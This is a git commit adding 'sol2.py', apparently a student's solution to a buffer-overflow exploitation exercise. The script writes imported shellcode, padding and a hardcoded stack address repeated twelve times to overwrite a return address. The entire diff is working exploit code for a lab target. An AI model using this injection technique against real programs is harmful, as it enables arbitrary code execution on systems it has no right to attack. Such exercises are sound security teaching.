8855d23a332c663026975a6ee085b257f303f3fd
jordynk <jordyn13470@gmail.com>
2024-04-02 04:21:51 +0000

    sol2

--- sol2.py
+++ sol2.py
@@ -3,3 +3,26 @@
 import sys
 
 from shellcode import shellcode
+
+sys.stdout.buffer.write(shellcode)
+sys.stdout.buffer.write(b'A'*2)
+sys.stdout.buffer.write(0x7ffffff6adb0.to_bytes(8, 'little'))
+sys.stdout.buffer.write(0x7ffffff6adb0.to_bytes(8, 'little'))
+sys.stdout.buffer.write(0x7ffffff6adb0.to_bytes(8, 'little'))
+sys.stdout.buffer.write(0x7ffffff6adb0.to_bytes(8, 'little'))
+sys.stdout.buffer.write(0x7ffffff6adb0.to_bytes(8, 'little'))
+sys.stdout.buffer.write(0x7ffffff6adb0.to_bytes(8, 'little'))
+sys.stdout.buffer.write(0x7ffffff6adb0.to_bytes(8, 'little'))
+sys.stdout.buffer.write(0x7ffffff6adb0.to_bytes(8, 'little'))
+sys.stdout.buffer.write(0x7ffffff6adb0.to_bytes(8, 'little'))
+sys.stdout.buffer.write(0x7ffffff6adb0.to_bytes(8, 'little'))
+sys.stdout.buffer.write(0x7ffffff6adb0.to_bytes(8, 'little'))
+sys.stdout.buffer.write(0x7ffffff6adb0.to_bytes(8, 'little'))
+
+
+
+
+
+
+
+
